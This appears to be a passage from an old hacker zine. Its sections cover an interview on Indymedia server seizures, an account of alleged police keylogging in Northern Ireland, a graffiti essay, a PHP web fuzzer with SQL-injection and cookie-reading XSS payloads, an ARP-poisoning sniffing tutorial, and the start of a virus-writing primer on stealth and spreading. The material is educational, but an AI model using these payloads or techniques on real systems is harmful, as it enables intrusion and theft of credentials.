have\r\nto use technology to negate the fact that authorities think they are above the\r\nlaw.\r\n\r\nUK: Precisely, it's not the first case and it's not the last. There's things\r\nhappening at the moment, servers taken all the time, it's a growing problem,\r\nindymedia needs to be aware of that and try to survive it.\r\n\r\nJeremy: How are people within hacking and programming communities stepped up to\r\nsupport the project?\r\n\r\nUK: In the last 3-4 months we started to put together as security team to go\r\nthrough each of the servers, each of the code bases, and work for them look for\r\nthe weaknesses. I think historically IndyMedia has been pretty lax about that,\r\nmore interested with people being able to publish freely and not quite so much\r\nabout the security of their systems in which the puiblising occurs, That's\r\nchanging, very quickly.\r\n\r\nJeremy: That brings me back to a couple months ago - there had been two major\r\nvulnerabilities - one happened during the RNC with the cross site scripting\r\nerror in dadaIMC - a group calling itself RightWingExtremist.net made use of\r\nthis during the RNC by changing many indymedia sites to redirect to a site that\r\nsaid 'indymedia is anti-american' or something crazy! [killing communists!]\r\n\r\nUK: The system we're using in the UK is very resiliant, it's java written, the\r\nguy's done a good job we haven't seen too many problems \r\n\r\nJeremy: Which one are you using?\r\n\r\nUK: We're using Mir, it's been pretty responsive.\r\n\r\nJeremy: I believe DadaIMC had had the most problems ..\r\n\r\nUK: Yeah, Dada has had a clear history of problems, I agree\r\n\r\nJeremy: A few months ago I had spoken to Spud regarding a vulnerability I\r\ndiscovered DadaIMC regarding uploading and excecuting PHP files. We privately\r\nnotified them of this vulnerability and said, \"listen we need to keep this quiet\r\nuntil each independent IMC staff is privatley notified and update it. Of course\r\nit's a big job and it's not something that'll happen overnight!\r\n\r\nUK: One thing I will say while I've got the opportunity is that there is a\r\nprivate list for IMC techies. It's a fairly rigorous process to get in there,\r\nbut if anyone finds an issue, dump it straight to the people who can deal with\r\nit imc-security@lists.indymedia.org is the place to dump in. The technies in\r\nthere have a web of trust where you can't get in unless two other people vouch\r\nfor you.\r\n\r\nJeremy: How do you think right-wing hackers and script kiddies have made use of\r\nthe open disclosure policy of dadaimc?\r\n\r\nUK: I can't really talk much about that unfortunately it's not something I have\r\nbeen involved with. Certainly people we're working with are going through\r\ndadaimc line by line. \r\n\r\nJeremy: How can hackers play a more integral role in the development and\r\nprotection of this software?\r\n\r\nUK: I think the trick is really just to get involved. To get to the point of\r\nwhere you're a member of the trusted team takes a little bit of work, but\r\nthere's nothing to stop people..\r\n\r\nJeremy: Yeah, cause they can still just download the source and just start\r\nauditing.\r\n\r\nUK: Yeah, but one thing we don't want happening this has happened once already .\r\nWe had a guy portscanned all 13 of the UK mirrors. Now in a sense he found\r\nthings we knew about, but on the other hand we don't want to encourage people to\r\nstart scanning our boxes because it generates extra processes - we'd be far\r\nhappier for people to work with us and communicate with us about what they're\r\ndoing this knd of thing- if anything so we don't block them.\r\n\r\nJeremy: I had personally installed it on localhost. How can hackers and civil\r\nrights activists collaborate and work together in order to help pressure the law\r\nand help take the battle to the courts?\r\n\r\nUK: I think the biggest thing is to get hackers to understand the issues.\r\nHackers at the end of the day don't break things. It doesn't take much to see\r\nthe political ramifactions of their actions. The only time you really think talk\r\nit as a community is when - the cisco case, something happens, something get\r\npulled, someone shits in their pants, but nobody takes the interest over a long\r\nterm basis. That's frustrating and it needs to change. What the Hack another con\r\nin Europe right now, their talk list is a lot more encompassing, they spend some\r\ntime with other issues than security per say, like the DMCA, counter-terrorism,\r\nthey think behind the box, and as a hacker community, we all need to do that.\r\n\r\nJeremy: I would certainly agree of your critique, especially of DEFCON, this\r\nseems more like a white hat drunken party, there's not as much teaching here,\r\nonly 10% of the people here are maybe hackers anyway, everyone else came here\r\nfor the culture, the sideshow. How do you think things have changed over the\r\npast few years in light of some of the new policies and anti-terrorism\r\nlegislation? How do you think the hacking community has changed, become more\r\nradicalized?\r\n\r\nUK: I think the UK and Europe is certainly starting to pick up this. However,\r\nunlike America where you have a huge great community, Europe doesn't have that,\r\nthat's one of the things that is being worked on right now, like the European\r\nconstitution, declaration of human rights, that kind of thing. We need to\r\ninvolved. The people in the ground need to get it done and push it. We've had a\r\nlot of success recently and we need to learn from it.. If European hackers can\r\nbond together, we can stop bad legislation, but we need to pull together. All\r\ntoo frequently this hasn't happened.\r\n\r\nJeremy: I'm looking at past conventions like Hackers on Planet Earth that\r\nhappened last summer. It was held in New York City a month before the Republican\r\nNational Convention, so naturally it was a lot more politically charged. I\r\nthought it was a lot more independent, more genuine, talking about hacker rights\r\nand digital rights and how we can protect systems such as IndyMedia - I believe\r\nthey actually had an IndyMedia speech and several other political speeches...\r\n\r\nUK: What the Hack was the same way. Italian government agents went in and\r\nsniffed the wire effectively and the ISP told IndyMedia it was a power outage.\r\nBut yeah, it's bound to happen.\r\n\r\nAlxciada: How long ago were your servers actually taken?\r\n\r\nUK: Trying to think, I believe it was last June\r\n\r\nJeremy: What do you think about the raid that happened about a month ago in\r\nBristol?\r\n\r\nUK: That's even worse and that's one of those things that are a real issue.\r\nIndymedia needs to move toward encryption circuits and publishing stuff so you\r\ncan't tie back to who precisely posted what. The Italian case - my awareness\r\nthat is they didn't realize how content is distributed.\r\n\r\nJeremy: What were the circumstances behind the Bristol server being seized? Were\r\nthey also looking for server logs?\r\n\r\nUK: Yeah, that was a case where a radical collective did some direct action\r\ndestroyed some property and police became involved. My understanding is that\r\nsomeone from IndyMedia tipped off the police. \r\n\r\nJeremy: So they broke concensus with the larger group, went directly to the\r\npolice, and that caused the server as a whole to be seized?\r\n\r\nUK: Yeah, and that was hosted in someone's house as well, so they came into\r\ntheir place.\r\n\r\nAlxciada: Did they have any mirrors?\r\n\r\nUK: They had another backup but it wasn't actively updated. It is very difficult\r\nto get a hold of someone with the Bristol project. The server was in Texas and\r\nit is difficult to actually switch over the backups. \r\n\r\nJeremy: The seizure in Bristol happened about a week before the G8\r\ndemonstrations?\r\n\r\nUK: Yeah, Bristol is fairly seperate collective of the UK, and they hadn't\r\nlearned the lessons UK IndyMedia have, which is a shame.\r\n\r\nJeremy: What do you have to say to people who are just beginning to get\r\ninvolved, just starting to understand these issues.

C ]\r\n[------------------------------------------------------------------------------]\r\n\r\nAt the first ever Northern Ireland Computer Security Enthusiast Convention\r\n(NICSE CON) held in the Europa Hotel Belfast saw the amalgamation of 87 hackers,\r\n14 Computer Science Professors, 19 System Administrators, and 4 Police Officers,\r\nAll with the common goal to seek and learn new security Information. \r\n\r\nThe Con held many activities such as \r\nCapture The Flag ( Fedora Systems Used) \r\nHack the Hotel ( A successful bid to take over the Hotels Internal IT system) \r\nThe Hammond Files ( An in-depth Discussion into his situation) \r\nHackthissite Ð ( Discussion into Origins, successÕs , Failures ) \r\nPresentations on Bluetooth Hacking\r\nPresentations on the Northern Ireland Hackers ( Growth, Skills ) \r\n\r\nAll in all it was a fantastic day, however as most of you DNScon and DEFCON\r\ngoers know, the real stuff doesnÕt happen until the con is over and people start\r\nto talk. \r\n\r\nAs I was one of the organisers, I was getting a lot of people coming up to me\r\ntalking about different things. However one man in particular caught my\r\nattention; he said he was a Police Officer working in the Computer Sides of\r\nthings Ð Forensics, Stings etc. So I immediately offered him to come join the\r\nother organisers and myself for the usual post-con pint of Guinness.\r\n\r\nAs usual the topic of Politics came up, and obviously his views were more than\r\ninteresting due to his occupation. Progressively we turned the conversation\r\naround to the IRA (Army sworn to keep Ireland Free from British Soldiers and to\r\ncreate a united Ireland). The officer started to talk about his involvement in\r\ncertain operations against the IRA (Strictly of the Record of Course:-P). \r\n\r\nOne of the operations he only heard about was the tapping of the Sinn Fein\r\nOffice (Sinn Fein the political Wing of the IRA). When Sinn Fein left their\r\noffices at night, the Special Agents would break into the offices and plant tiny\r\nlittle bugging devices so they could hear the Sinn Fein Leaders speak. Not only\r\nwas this not authorised but also HIGHLY illegal. \r\n\r\n(picture)\r\n\r\nThis is part of a British MI5/PSNI bugging device found hidden in the\r\nfloorboards of a Sinn Fein office in Belfast in September 2004. Approx 10.5\r\ninches by 6.5 inches.\r\n(At this point I may tell you that this officer was totally against all of this\r\nillegal activity from the police, and he knew his consequences of telling us\r\nthis information. However reasons not known to us, he told us everything. For\r\nthis, we thank you) \r\n\r\nThe officer also got us interested by the current case that he was working on at\r\nthe time. Operation ÒMirrorÓ Ð This operation called for the officer and a team\r\nof computer Experts within the force to implant Key logging Software onto IRA\r\nsuspects as well as Sinn Fein Politicians. This software was implanted by\r\nseveral methods. By finding computers that the Suspects used and actually\r\nloading the software onto the computer in front of them, or the less than legal\r\nway of inserting this software onto the Suspects and Politicians computer\r\nremotely ( i.e. HACKING). \r\n\r\nThe officer told us, that none of this was legal, and none of this was given\r\npermission from the Chief Constable. However the team were told to keep this a\r\nsecret. Another interesting point was that the data obtained from the suspects\r\nwas used to Black Mail the suspects. They also found Credit Card numbers and ran\r\nillegal checks on their purchases. \r\n\r\nThis says a lot about the Northern Ireland Police Service. That they would be as\r\nlow as to perform illegal acts in order to Blackmail and incriminate innocent\r\npeople. However this isnÕt just an isolated case in Northern Ireland, its all\r\nover the world. \r\n\r\n[------------------------------------------------------------------------------]\r\n[ graffiti and counter-culture ........................ the wooster collective ]\r\n[------------------------------------------------------------------------------]\r\n\r\nThe graffiti movement is by its very nature a counter-culture,\r\nanti-establishment mindset that is an alternative to the mainstream. It is a\r\nrejection of the status quo.\r\n\r\nWhen you decide that you are going to go up against the establishment, often all\r\nyou have is yourself. The only way you can survive is to protect yourself. If\r\nyou don't protect yourself, you die. If not literally, then spiritually.\r\nBecause you don't have any resources given to you by the mainstream\r\nestablishment that you rejected, the only way you can surviive and protect\r\nyourself. The way you do this is to develop your own personal moral code that\r\nallows you to survive in a world that is outside \"the norm\" It is this code that\r\ndrives you. Not money. Not a house with a white picket fence. Only your beliefs.\r\nThe code is what gives you piece of mind when things get tough. It's what allows\r\nyou to go to jail for your actions and then get right back out there to get up\r\nonce again.\r\n\r\nIt's the code that stops you from going crazy.\r\nSo where do you develop this code?\r\nYou develop it on the streets.\r\nYou learn it from watching and talking to others.\r\nBut most importantly, you get it from experiencing life.\r\n\r\nAnd that's why graf culture is so powerful to people who do it. You get to\r\nexperience life to the fullest. You are truly alive, risking what you have,\r\nrejecting the establishment, but living your life the way you have defined it.\r\nYou have real, true freedom.\r\n\r\nAs you experience life on the street you begin to pick up experiences like they\r\nwere little scraps of paper. And you start to make a collage with the\r\nexperiences. You put all of the scraps together and it becomes your own personal\r\nfabric that defines who you are.\r\n\r\nYou are defined by reality, not by television.\r\nYou are defined by experience, not by aspiration.\r\nIt's your code and nobody elses. And nobody can take it away from you.\r\nAnd now, suddenly, you have a weapon.\r\nThe code itself becomes your weapon.\r\n\r\nYour life is on the street. And there's an order to it. You know where things\r\nare meant to be. Things are where they should belong. Ads go on billboards.\r\nGraffiti goes on walls and doors. The two co-exist. They clash, but they know\r\nwhere they each should be.\r\n\r\nIf you're living the life of a true graffiti artist, you're livin' by the code\r\nyou have created for yourself.\r\n\r\nAnd what this means is...\r\n\r\nGraffiti shouldn't be in ads and ads shouldn't be in graffiti.\r\nGraffiti in an ad is an ad. It's not graffiti.\r\nGraffiti done legally is public art sanctioned by the establishment. It's not\r\ngraffiti.\r\n\r\nFor graffiti to be graffiti, it has to be done illegally.\r\n\r\nPeriod.\r\n\r\n                                !!!!!!!!!!!!!!!!\r\n                                !!!

For the purpose of this article, we will write several\r\nfunctions for a PHP script which will fuzz the GET parameters of a URL to\r\ntrigger error codes and discover potential vulnerabilities. We will then explore\r\npossibilities of expanding the functionality to become a broader\r\nall-emcompassing web vulnerability auditing tool.\r\n\r\nOur web fuzzer works by taking a URL and manipulating each GET variable to make\r\nevery possible combination of requests with an array of malicious characters\r\ndesigned to generate errors. Consider the following array which contains a large\r\nselection of common requests which often generate errors and could open scripts\r\nup to security holes.\r\n\r\n// malicious web requests\r\n$vulnchars[0] = array(\"%00\",\"%2527%252esasdf\",\"%u0000\",\r\n\"%u5c00%u2700\",\"/\",\"../\",\"./..././\",\"/%2e/\", \"%2e\",\"%5C\",\"%s\", \"'\",\"'''''\",\"\\\"\",\r\n\"%%%%%%\",\"!!!!!!!!!!!!!!!!!!\",\"#\", \"%5C27\",\"%%5C%56\" , \"\\'\", \"\\\\\",';',\";a\", \"|\",\r\n\"\\?>\", \"%a0\");\r\n// malicious sql requests\r\n$vulnchars[1] = array(\" OR 1=1\", \"' OR '!'='!\");\r\n// malicious xss requests  \r\n$vulnchars[2] = array(\"javascript:alert(String.fromCharCode(65,66,67))\",\r\n\"<script>alert('cookies, yo: ' + document.cookie);</script>\");\r\n\r\nWe would then make all possible combinations of web requests and analyze the\r\noutput. Scan the results for an array of common error code output and generate a\r\nlist of 'flagged' URLs to be later reviewed for auditing purposes. We have put\r\ntogether the following array which contains a list of common web, sql, and xss\r\nerrors.\r\n\r\n$flags[0] = array(\"<b>warning</b>:\", \"warning:\", \"<b>fatal error</b>\", \"failed\r\nto open stream:\", \"internal server error\", \"there was an error when processing\r\nthis directive.\", \"http/1.1 400\", \"http/1.1 403\", \"http/1.1 500\", \"gateway\r\nerror\", \"command not found\", \"file not found\");\r\n$flags[1] = array(\"[obdc\", \"mysql error\", \"you have an error in your sql\r\nsyntax\", \"odbc drivers error\", \"[microsoft sql\", );\r\n$flags[2] = array(\"javascript:alert(string.fromcharcode(65,66,67))\",\r\n\"<script>alert('cookies, yo: ' + document.cookie);</script>\");\r\n\r\nNow that we know what kind of requests to make and what we should be parsing the\r\noutput for, we can write some PHP code which will query the HTTP server for our\r\nrequests. In this example, we are only making GET requests, but it can be easily\r\nmodified ti include other HTTP methods.\r\n\r\nfunction MakeRequest($url, $method=\"GET\") {\r\n  $url = str_replace(\" \", \"%20\", $url);\r\n  if ($method==\"GET\") {\r\n    $host = substr($url, strpos($url, \"://\") + 3);$host=substr($host,\r\n0,strpos($host, \"/\"));\r\n  $request = substr($url, strpos($host, \"/\"));\r\n\r\n  $fp = @fsockopen($host, 80, $errno, $errstr, 10);\r\n  if (!$fp) {\r\n     echo \"    ERROR . $url $errstr ($errno)$newline\";\r\n  } else {\r\n     $out  = \"GET $request HTTP/1.1\\r\\n\";\r\n     $out .= \"Host: $host\\r\\n\";\r\n     $out .= \"Connection: Close\\r\\n\\r\\n\";\r\n     fwrite($fp, $out);\r\n     while (!feof($fp)) {\r\n         $buf.= fgets($fp);\r\n     }\r\n     fclose($fp);\r\n    }\r\n  } \r\n  return $buf;\r\n}\r\n\r\nNow that we can get results from the HTTP server for our malicious requests, we\r\nneed to run it through a function to scan it for the error codes listed above.\r\nThe following function returns true if the $result has any matches from the\r\n$flags array.\r\n\r\nfunction TestResult ($result) {\r\n  global $flags;\r\n  $result = strtolower($result);\r\n  for ($i=0;$i < count($flags);$i++) {\r\n    for ($o=0;$o < count($flags);$o++) {\r\n      if (!(strpos($result, $flags[$i][$o]) === false)) {\r\n        return 1;\r\n      }\r\n    }\r\n  }\r\n  return 0;\r\n}\r\n\r\nHaving all the pieces we need, it's time to write some code to tie everything\r\ntogether. The following code uses the array $lists to contain all URLs to probe.\r\nIt first parses the URL for all GET parameters to fuzz and starts a loop to test\r\nall possible combinations of unique URLs. It goes through each GET variable and\r\ntries each malicious character while using the default value of all other GET\r\nparameters. The total number of requests should be around N ^ N for each url in\r\n$list where N is the number of GET parameters in each URL). It then MakesRequest\r\nfor each unique URL and passes the results off to TestResult, announcing if a\r\nmatch against one of the error codes from $flag.\r\n\r\n    for ($inc=0;$inc<count($list);$inc++) {\r\n\t  if ($localonly == true AND (substr($list[$inc], 0, 17) !=\r\n\"http://localhost/\" AND substr($list[$inc], 0, 17) != \"http://127.0.0.1/\"))\r\ndie(\"Sorry, this script can only be tested against localhost.\");\r\n\t  \r\n\t  // SetUpParameters parses and stores each GET paramater from a URL into\r\nthe array $get and $getvalues\r\n\t  $url = SetUpParameters($list[$inc]);\r\n\t  if (trim($url) != \"\") { \r\n\t  echo \"$newline$url$newline\";\r\n      // go through each kind of vulnerability we are testing\r\n\t  for ($vulni=0;$vulni<count($vulnchars);$vulni++) {\r\n\t\tswitch ($vulni) {\r\n\t\t  case 0: echo \"  * General web vulnerabilities$newline\"; break;\r\n\t\t  case 1: echo \"  * SQL vulnerabilities$newline\"; break;\r\n\t\t  case 2: echo \"  * XSS vulnerabilities$newline\"; break;\r\n\t\t}\r\n\t\t// go through each GET parameter in the URL\r\n\t\tfor ($o=0;$o < count($get);$o++) {\r\n\t\t  for ($i=0;$i<count($vulnchars[$vulni]);$i++) {\r\n\t\t\t// generate url from list of vulnerable characters\r\n\t\t\t$whichparam = $get[$o];\r\n\t\t\t$testing = $url . \"?\";\r\n\t\t\t// put together the default values for all the other parameters in\r\nthe script\r\n\t\t\tfor ($z=0;$z<count($get);$z++) {\r\n\t\t\t  if ($get[$z] != $whichparam)\r\n$testing.=\"&\".$get[$z].\"=\".$getvalue[$z];\r\n\t\t\t}\r\n\t\t\t$testing .= \"&\" . $whichparam . \"=\" . $vulnchars[$vulni][$i];\r\n\t\t  \r\n\t\t\t$fun = MakeRequest($testing);\r\n\t\t\tif ($parseforlinks == true) ParseForLinks($fun);\r\n\t\t\t$error = TestResult($fun);\r\n\t\t\tif ($error != 0) \r\n\t\t\t  echo \"    FLAG! .. $testing$newline\";\r\n\t  \t\tif ($error == 0 and $verbose == true)\r\n\t\t  \t  echo \"    OK    .. $testing $newline\";\r\n\t\t    }\r\n\t\t  }\r\n\t    }\r\n\t  }\r\n\t}\r\n\t\r\nThis code is the bare essentials to writing a web GET request fuzzer. There are\r\nloads of features which can expand this script to be a more encompassing web\r\nauditing tool. For starters, the script can be written to read the output of a\r\nURL and spider it for additional URLs in <a href=\"http://$host/\"> tags to be\r\nadded to the $list array. It can also be expanded to include other methods\r\nincluding POST, SSL, cookies, and file upload vulnerabilities. Writing a web\r\nfuzzer is a rewarding programming exercise where the possibilities are endless.\r\n\r\n\r\n[----------------------------------------------------------------------------- ]\r\n[ arp poisoning ................................................. by darkangel ]\r\n[----------------------------------------------------------------------------- ]\r\n\r\nIntroduction\r\nThis article is meant to teach how ARP works and how one can go about poisoning\r\nthe ARP cache and enable them to completely sniff traffic over a switched\r\nnetwork. This article assumes that you already have access to a switched\r\nnetwork. ARP Poisoning is a way of tricking computers over a switched network to\r\nsend traffic through you before going to other computers or out to the internet.\r\n\r\nAddress Resolution Protocol(ARP)\r\nARP is a dynamic protocol to map a 32bit IP Address to a 48bit physical hardware\r\naddress (MAC Address). If one system over a network wants to communicate with\r\nanother system over a network, it will first check if it already knows that\r\nsystems MAC Address and if not it will send out an ARP broadcast which will look\r\nfor the hardware address of the destination system. There are four types of ARP\r\nmessages but the main two are ARP Request and ARP Reply. When a system starts\r\nbroadcasting an ARP Message it sends out an ARP Request. An ARP Request is a\r\nmessage sent to the broadcast address, the message contains the sender's IP\r\nAddress and MAC Address and requests the MAC Address of the given IP, and then\r\nit waits for an ARP Reply. An ARP Reply replies to the ARP Request and tells the\r\ncomputer sending the ARP Request what its MAC Address is. \r\n\r\nThe ARP Cache is a temporary storage place that holds a table with MAC Address's\r\nand IP Address's. If a computer wants to talk to another computer and it doesn't\r\nalready have its MAC address stored it will send an ARP Request. If the Computer\r\nthat is sending the ARP Reply does not have the requesting computers MAC Address\r\nit as well will save it to cache. So now both computers have the MAC Address. A\r\nsystem cannot communicate with another until it has its MAC Address.\r\n\r\nARP is a stateless protocol with no authentication built in so any ARP Reply,\r\nwhether there was a request or not will update the ARP Cache on a computer. All\r\nsystems will accept an ARP Reply regardless if there was an ARP Request sent.\r\n\r\nThe Switch\r\nMedia Access Control (MAC) is a standard addressing system for all Ethernet\r\ndevices. Most networks use switching devices and in a switched network packets\r\nare only sent to the port they are destined to according to their destination\r\nMAC Address. Switches maintain a table that associates MAC Address's with\r\ncertain ports. A switch constructs a route table by extracting the source MAC\r\nAddress from the Ethernet frame of each packet processed. If any entry in the\r\nroute table does not exist the switch will forward the packet out all of its\r\nports. \r\n\r\nWithin a switched network packets are only sent to the destination device making\r\nit, so other devices cannot see the traffic.\r\n\r\nPoisoning\r\nThere are a few tricks to manipulating a network to send traffic through you\r\nbefore sending it to the packets to the destination device. One of these methods\r\nis referred to as ARP Poisoning and it is when you send a customized ARP Reply\r\nto different computers across the network tricking their computers into updating\r\ntheir ARP cache with new MAC Address's (Your MAC Address). So now each time\r\ncomputer1 wants to send a message to computer2 it gets the MAC address of\r\ncomputer2's IP and sends the message to that MAC address. But if that MAC\r\naddress is changed to your MAC address, by poisoning the ARP Cache the message\r\nwill be sent to you instead. After packets are sent to you, you must forward the\r\npackets to the computer it was meant to go in the first place or DoS will be\r\ncaused and the hosts will not be able to communicate anymore. Another factor\r\nthat you must weigh in are timeouts, if there is no traffic over the network,\r\nafter a timeout period the ARP cache of the computers across a network will be\r\nflushed out and you will need to send another constructed ARP reply to the hosts\r\nso that traffic is once again forwarded to you.  One way to fix this is to\r\nautomatically send ARP Replies every 10 seconds or so to the hosts that you want\r\nto poison.\r\n\r\nSniffing\r\nSniffing is the act of capturing packets that aren't necessarily meant for\r\npublic viewings. When you sniff packets across a network you can come across\r\nmany interesting things such as emails, instant messages, and even passwords to\r\nemail accounts and ftp accounts and many other types of passwords which in my\r\nexperience are more often than not, left unencrypted. There are many tools out\r\nthere that will automatically scan packets for username and password info. You\r\ncan also see what websites the person is going to.\r\n\r\nWireless\r\nIf an access point is connected directly to a hub or a switch than it leaves the\r\nentire wireless network open to ARP Poisoning. Wireless internet is becoming\r\nmore and more used and it is hard to be anywhere that does not have a wireless\r\naccess point, especially in well populated areas. This leaves a huge security\r\nrisk to most networks because in theory someone with a laptop could go into the\r\nlobby of a business and get on their network by cracking their WEP key or just\r\nsimply connecting if they don't even have WEP. The attacker would then just need\r\nto poison the ARP Cache of the different computers across the network and then\r\nforward all traffic through you. You would get their passwords and usernames,\r\nthe websites they go to and anything else that you feel would be fun to look at. \r\n\r\nTools\r\nEttercap http://www.ettercap.sourceforge.net \r\nAllows you to sniff networks and poison the arp and auto redirect traffic\r\nTCP Dump http://www.tcpdump.org/ \r\nA general purpose packet sniffer\r\nCain&Able http://www.oxid.it/cain.html \r\nAllows you to sniff networks and poison the arp and redirect traffic.

I think this is one of the main reasons why the VX\r\nscene exists. Most viruswriters (including me) enjoy the challange of creating a\r\nsmall life form that \"lives\" on it's own.\r\n\r\n0) Introduction\r\nWell, enough preaching for today. Before I start with technical explainations, I\r\nwill first make a few things clear to the really,really new people out there.\r\n\r\n0->1) What is a virus?\r\nWell, a better question would be, what is malware? As this umbrellaterm covers\r\nmuch more than just virii. Malware is the common term for any unwanted program\r\non your box. It can be divided in several catogories:\r\n\r\nI) Virii.\r\nMost people think virii and malware are the same, but that is a common\r\nmisassumption. A virus is (in my opinion) best defined as: \"A self-replicating\r\nprogram that abuses other (host) programs in order to spread\". A virus always\r\nneeds a host program, it cannot spread on it's own, it needs other programs to\r\ninfect.\r\n\r\nII) Worms.\r\n\r\nThe main difference between a worm and a virus are the way of replication, a\r\nworm can live without a host, it's like a bacteria, it copies itself and\r\npropagates itself trough many different ways. Unlike a virus, most worms won't\r\ninfect other programs.\r\n\r\nIII) Trojans.\r\n\r\nThese sneaky little devils derive their name from the ancient greek myth of the\r\nwooden horse of Troje (you know, with Odysseus inventing a trick to get into the\r\ncity and coming up with this huge wooden horse which contains the greek\r\nsoldiers). Well, today's trojan horses are much like that, they pose like an\r\ninnocent or (more often) a very attractive file, but they actually contain a\r\ndangerous payload, either they are disguised worms, virii, spyware, logic bombs,\r\nor RAT's (Remote Administration Tools).\r\n\r\nIV) Spyware.\r\n\r\nThese are the new players in today's cyber-battlefields. Spyware is a term for\r\nany piece of software that monitors the victim's habits, from surfing habits to\r\nchat passwords, to banking passwords to full scale corporate espionage.\r\n\r\nV) Logic Bombs.\r\n\r\nQuite rare, Logic Bombs are programs that triger when a certain event happens\r\n(or doesn't happen). When you are the victim of a logic bomb, you know that\r\nsomeone is really after you, because they don't spread in the wild. Logic bombs\r\nare commonly created by disgruntled programmers who didn't receive their\r\npayment, or are afraid they won't receive it. A logic bomb triggers when certain\r\nconditions are met, like a date, or the deletion of a certain file. Imagine a\r\nprogrammer works somewhere, and he installs a LB that requires him to enter a\r\npassword every month, else it will erase the entire box' harddrive. When the\r\nprogrammer gets fired, he can't enter the password, and the company loses all\r\nthe data on the programmer's box.\r\n\r\n0->2) Types of malware.\r\n\r\nI) Virii.\r\n\r\na) Overwriters, these are quite common in the viral world. They just replace the\r\nhostprogram with themselves, erasing the program.\r\n\r\nb) Companions, these virii don't alter the hostfile, they hide them from the\r\nuser and rename them, taking their place and executing the host after they are\r\ndone.\r\n\r\nc) Bootsector virii, these virii infect a HD or floppy bootsector, initiating\r\nthemselves at each startup, without user interaction, making them quite\r\npowerfull.\r\n\r\nd) Prependers, these virii place their code in front of the victim code,\r\nexecuting themselves before the victim code can, thus not notifying the victim\r\nof missing files.\r\n\r\ne) Appenders, the same as prependers, only they execute after the victim code.\r\n\r\nf) Memory-resident, these type of virii use TSR techniques (Terminate and Stay\r\nResident), to remain in the box' memory (usually by interupt hooking) until\r\nsomething happens (a .exe file is opened) and then they infect files this way.\r\n\r\ng) Encrypted virii, to fool scanners in the old days, virii used to encrypt\r\ntheir opcode bodies, and decrypted themselves during runtime. This technique has\r\nevolved a long way (see below).\r\n\r\nh) Oligomorphic virii, these virii are encrypted virii, who change their\r\ndecryption/encryption key at every replication, thus making it harder for a\r\nvirus scanner to detect them.\r\n\r\ni) Polymorphic virii, a quite advanced technique, these little devils substitute\r\nwhole opcode blocks with blocks that look different, but do the same.\r\n\r\nj) Metamorphic virii, one of the newest techniques to fool AV's, these virii\r\nreplace entire blocks of logic in their bodies. They replace 3 with (1+2) or (6\r\n/ 2) or (((2 * 2) +2) / 2) for example.\r\n\r\nk) EPO virii, entry point obscuring (or obfuscating) virii place their code body\r\nsomewhere random inside the host's body, and modify the host to jump to the\r\npoint where the virus starts, thus forcing AV's to scan entire files, slowing\r\nthem down.\r\n\r\nl) Cross-infection virii, these virii infect multiple file types, thus\r\nincreasing their effectiveness.\r\n\r\nm) Cryptovirii, these are relatively rare, encoding entire harddrives with  a\r\npublickey algorithm, and forcing the victim to pay the viruswriter ransommoney\r\nto decode his/her HD (also called Ransomware).\r\n\r\nII) Worms.\r\n\r\na) Massmailing, these worms harvest e-mail adresses from a box (either from WAB\r\nfiles, messenger contact lists or other addressbook files) and mail themselves\r\nto them to propagate, they will travel around the world really quick, but will\r\nattract virusanalyst's attention really quickely too, making them somewhat blasŽ\r\n(and unsubtle) in my opinion.\r\n\r\nb) P2P, these worms spread trough peer-to-peer software, propagating as popular\r\nfilenames (music, movies, pictures, programs, etc), these could go nearly as\r\nfast as Massmailers (as long as they make sure they keep propagating as files\r\nthat are still popular) and far more silent.\r\n\r\nc) I-Worms, Internet worms are a special case, the very first worm, the\r\nmorris-worm, was also an internetworm, but it took more than 15 years before the\r\nsecond I-Worm appeared. I-Worms are often referred to as Warhol-worms, derived\r\nfrom Warhol's prediction that in the future everybody will be famous for 15\r\nminutes. I-Worms travel by exploiting security gaps, like Morris' sendmail bug.\r\nCode-Red,Nimda, Sasser and Zotob are all Warhol worms (I-worms) and are\r\nextremely successfull.\r\n\r\nd) Botnet worms, these worms function a bit as a trojan too. They use the\r\nvictim's box as a zombie, allowing the attacker to remotely use the victim's pc\r\nto send spam, log passwords and launch ddos attacks.\r\n\r\ne) Neural-Network worms, I have never heard of one seen in the wild, just as a\r\npoc (proof of concept). Often referred to as Curious Yellow worms, these worms\r\ncommunicate with each other in order to exchange information over possible\r\nvictims, new exploits to use to propagate and new anti-antivirus techniques.\r\nThese worms could harbor a self-improving/self-rewriting mechanism, making them\r\nvirtually invincible. But it would take a group of very experienced A.I.\r\nScientists to code such a worm.\r\n\r\nIII) Trojans.\r\n\r\na) R.A.T's\r\n\r\nThe most popular of trojans, these programs allow an attacker to remotely\r\ncontrol the infected box, gathering sensitive info, or using it to launch ddos\r\nattacks, use it as a tunnel to root other boxes or to anonymously launch new\r\nviral epedemics.\r\n\r\nb) Rootkits\r\n\r\nI don't know if these can be considered trojans, but they are (in my opinion)\r\nbest classified here. Rootkits allow a remote attacker stealthy access to a box,\r\nhiding processes, directories, files and extra accounts.\r\n\r\nb) other\r\n\r\nAny program, disguising itself as something else, could be considered a trojan.\r\n\r\nIV) Spyware\r\n\r\na) Homepage/Searchpage Hijackers\r\n\r\nThese programs change your homepage and searchpage to a page of the author's\r\nchoice.\r\n\r\nb) Dialers\r\n\r\nDialers abuse the victim's dialup connection to dial to a very expensive number\r\nsomewhere abroad, generating money for the author.\r\n\r\nc) Habit-trackers\r\n\r\nThese programs track your surfing-habits, advertising things you ( according to\r\nyour surfing) want.\r\n\r\nd) Keyloggers\r\n\r\nCould also be classified under trojans. Keyloggers monitor your keystrokes,\r\nstealing your passwords and sending them to a remote attacker for his goals.\r\n\r\nV) Logic Bombs\r\n\r\nsee explanation in 0->1.\r\n\r\n\r\n\r\n1) Abstract concepts\r\n\r\nNow we know some basic malware concepts, we can delve further in theory about\r\nmalware development.\r\n\r\n1->1) Survival Concept\r\n\r\nFirst we need to know what is important for malware to survive. Well, here are\r\nsome important things:\r\n\r\nI) Spreading\r\n\r\nThe most important feature of most malware is to spread as far as possible,\r\ninfecting a lot of files/boxes.\r\n\r\nII) Efficiency\r\n\r\nDoing what it is designed for is of course extremely important. For some worms\r\nit would be taking down a website, or for spyware it would be monitoring surfer\r\nhabits.\r\n\r\nIII) Stealth\r\n\r\nNot being detected by AV's is crucial in surviving. If malware is detected it\r\nsoon becomes unusable and dies.\r\n\r\n1->2) Survival Theory\r\n\r\nI) Spreading\r\n\r\nSpreading can be done in many ways. As described in 0->2, malware can take on\r\nmany propagation forms. Very important when spreading is a part of\r\nsocial-engeneering. Sending a mass-mail like:\r\n\r\n----------start of mail---------------------\r\n\r\nSubject: dfjadsad\r\n\r\nBody: 